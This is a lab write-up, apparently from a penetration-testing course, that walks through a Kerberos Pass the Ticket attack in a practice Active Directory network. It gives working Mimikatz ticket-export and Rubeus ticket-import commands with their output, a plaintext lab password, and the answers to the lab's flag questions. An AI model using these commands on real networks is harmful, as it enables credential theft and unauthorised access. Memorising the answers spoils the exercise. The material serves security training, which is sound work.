...
Another method for moving laterally in an Active Directory environment is called a [Pass the Ticket (PtT)](https://attack.mitre.org/techniques/T1550/003/) attack. In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash.
...
## Questions
RDP to 10.129.204.23 (ACADEMY-PWATTACKS-LM-MS01) with user "Administrator" and password "AnotherC0mpl3xP4$$"
1. Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect? **Answer: 3**
   - `$ xfreerdp /v:10.129.15.58 /u:Administrator /p:'AnotherC0mpl3xP4$$'` 
   - `C:\Tools> mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit`
   - Count the tickets with the user's name followed by `@`:
        ```cmd
        C:\tools>dir
        ...
        03/02/2026  04:38 AM             1,705 [0;3e4]-0-0-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi
        03/02/2026  04:38 AM             1,703 [0;3e4]-0-1-40a50000-MS01$@DNS-dc01.inlanefreight.htb.kirbi
        03/02/2026  04:38 AM             1,739 [0;3e4]-0-2-40a50000-MS01$@GC-DC01.inlanefreight.htb.kirbi
        03/02/2026  04:38 AM             1,633 [0;3e4]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
        03/02/2026  04:38 AM             1,633 [0;3e4]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
        03/02/2026  04:38 AM             1,743 [0;3e7]-0-0-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi
        03/02/2026  04:38 AM             1,659 [0;3e7]-0-1-40a50000.kirbi
        03/02/2026  04:38 AM             1,705 [0;3e7]-0-2-40a50000-MS01$@LDAP-DC01.inlanefreight.htb.kirbi
        03/02/2026  04:38 AM             1,743 [0;3e7]-0-3-40a50000-MS01$@ldap-DC01.inlanefreight.htb.kirbi
        03/02/2026  04:38 AM             1,633 [0;3e7]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
        03/02/2026  04:38 AM             1,633 [0;3e7]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
        03/02/2026  04:38 AM             1,641 [0;599ad]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi
        03/02/2026  04:38 AM             1,623 [0;5a3b3]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
        03/02/2026  04:38 AM             1,633 [0;5ac16]-2-0-40e10000-david@krbtgt-INLANEFREIGHT.HTB.kirbi
                    18 File(s)     10,095,706 bytes
                    3 Dir(s)  17,981,870,080 bytes free
        ```
2. Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \\DC01.inlanefreight.htb\john **Answer: Learn1ng_M0r3_Tr1cks_with_J0hn**
   - Use john's ticket exported from Mimikatz and import it using Pass the Ticket:
        ```cmd
        C:\tools>Rubeus.exe ptt /ticket:[0;5a3b3]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
        ...
        [+] Ticket successfully imported!
        ```
   - Now that we have john's TGT, we can authenticate with the SMB share and read the flag:
        ```cmd
        ...
        07/14/2022  02:54 PM                30 john.txt
                    1 File(s)             30 bytes
                    2 Dir(s)  18,267,840,512 bytes free
...
3. Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt **Answer:**
   ...
   - Use Powershell Remoting to run commands on DC01:
        ...
        [DC01]: PS C:\Users\john\Documents> cd ..\..\..\john\
        [DC01]: PS C:\john> dir
        ...
        P4$$_th3_Tick3T_PSR
        ```
4. Optional: Try to use both tools, Mimikatz and Rubeus, to perform the attacks without relying on each other. Mark DONE when finish. **Answer: DONE**